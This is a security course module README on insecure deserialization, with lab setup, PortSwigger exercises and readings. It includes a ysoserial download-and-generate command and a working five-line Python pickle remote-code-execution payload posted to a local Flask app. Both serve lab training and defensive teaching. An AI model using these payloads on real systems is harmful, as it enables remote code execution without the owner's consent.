# Week 11: Insecure Deserialization

## 🎯 What you'll learn

- Identify language-native deserialization sinks in 4 languages (Java, PHP, Python, .NET)
- Walk a Java `readObject` chain to RCE using **ysoserial**
- Exploit Python `pickle` RCE with a 5-line payload
- Spot PHP magic methods (`__wakeup`, `__destruct`) and chain object injection
- Understand why JSON deserialization is *usually* safe - and the few cases where it isn't
- Choose safe data formats and validators for new code

By the end of this week you'll be able to:

- Recognize binary serialization formats in HTTP traffic (Java, .NET, PHP, Python pickle)
- Find a serialization sink in code review (`ObjectInputStream`, `pickle.loads`, `unserialize`, `BinaryFormatter`)
- Generate a payload with ysoserial against a known-vulnerable Java app in lab
- Explain why "don't deserialize untrusted data" is the only real defense

## Why this matters

This is the bug class behind several of the worst CVEs of the last decade - Apache Commons Collections (multiple), Spring4Shell (CVE-2022-22965), the Log4Shell-adjacent JNDI gadgets. It's also OWASP A08:2021 (Software and Data Integrity Failures).

## ⚠️ Scope reminder

**Lab only.** Generated gadget chains are real-world RCE primitives. Never test against systems you don't own. See [root readme](../readme.md#️-ethics--scope).

## 🧰 Lab setup

### Lab 1: PortSwigger Academy - Deserialization

[9 deserialization labs](https://portswigger.net/web-security/deserialization). Recommended:

1. ["Modifying serialized objects"](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
2. ["Arbitrary object injection in PHP"](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)
3. ["Exploiting Java deserialization with Apache Commons"](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
4. ["Exploiting PHP deserialization with a pre-built gadget chain"](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)

### Lab 2: ysoserial (Java)

```bash
# Download a release
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

# Generate a payload
java -jar ysoserial-all.jar CommonsCollections5 'touch /tmp/pwned' > payload.bin
```

ysoserial generates serialized-Java payloads that, when deserialized by a vulnerable app (using vulnerable library versions), execute commands. Tested against PortSwigger labs.

### Lab 3: A Python pickle vulnerable Flask app

Minimal Flask app with a `/api/import` endpoint that does `pickle.loads(request.data)`. Lab demonstration:

```python
import pickle, requests, os

class Evil:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
requests.post('http://localhost:5000/api/import', data=payload)
```

The 5-line RCE that's been a CTF staple for 10 years.

## ✅ Your job

1. **Solve "Modifying serialized objects."** Just changing a field in a PHP-serialized string is enough.
2. **Solve "Arbitrary object injection in PHP."** Triggers `__wakeup`; you write the malicious class.
3. **Generate a ysoserial payload and use it against the PortSwigger Apache Commons lab.** This is the canonical Java RCE chain.
4. **Read [attack.md](attack.md).**
5. **Read [defense.md](defense.md).**

## 📚 Required reading

| Resource | Why | Time |
|---|---|---|
| [PortSwigger - Insecure deserialization](https://portswigger.net/web-security/deserialization) | The taxonomy | 45 min |
| [OWASP - Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) | Defense by language | 30 min |
| [ysoserial GitHub](https://github.com/frohoff/ysoserial) | Tool + the gadget chain catalog | 20 min |
| [Sonar - Decade of Java deserialization vulns](https://www.sonarsource.com/blog/this-mockingbird-knows-some-tricks-2/) | Background | 20 min |

## 💡 What you should already know

- The difference between serialization (object → bytes) and parsing (bytes → object)
- That JSON is a *data format* whereas language-native serialization (Java, pickle, PHP, .NET) carries *executable behavior*
- The pattern of magic methods (constructors, destructors, `__init__`, `__wakeup`, etc.)
- That this bug class is RCE 99% of the time - the highest-impact you'll encounter
